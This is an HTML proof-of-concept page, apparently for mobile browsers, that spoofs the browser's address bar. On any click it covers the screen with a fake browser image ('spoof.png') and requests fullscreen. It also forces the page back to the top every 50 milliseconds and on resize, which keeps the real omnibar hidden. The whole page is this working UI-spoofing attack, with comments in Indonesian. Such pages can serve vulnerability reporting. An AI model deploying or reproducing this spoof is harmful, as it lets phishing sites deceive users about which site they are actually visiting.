<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 200vh; /* supaya page bisa scroll */
            font-family: sans-serif;
        }
        #spoof {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: none;
            z-index: 9999;
            object-fit: cover;
            pointer-events: none;
        }
        #content {
            text-align: center;
            padding-top: 140px;
        }
    </style>
</head>
<body>

<img id="spoof" src="spoof.png" alt="overlay">
<div id="content">
    <h1>Click anywhere on the page to spoof the omnibox!</h1>
</div>

<script>
const spoof = document.getElementById("spoof");
const content = document.getElementById("content");

// Fungsi paksa scroll ke atas
function scrollToTop() {
    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

// Tap anywhere → fullscreen + overlay
onclick = async () => {
    spoof.style.display = "block";
    content.style.display = "none";

    if (document.documentElement.requestFullscreen) {
        try {
            await document.documentElement.requestFullscreen();
        } catch(e) {}
    }

    // Scroll ke atas langsung (untuk safety)
    scrollToTop();
}

// Ketika keluar fullscreen → scroll ke atas supaya omnibar tertutup
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
        scrollToTop();
    }
});

// Interval ekstra untuk Android back / omnibar muncul
setInterval(scrollToTop, 50);

// Resize listener juga untuk Android omnibar
window.addEventListener('resize', scrollToTop);
</script>

</body>
</html>
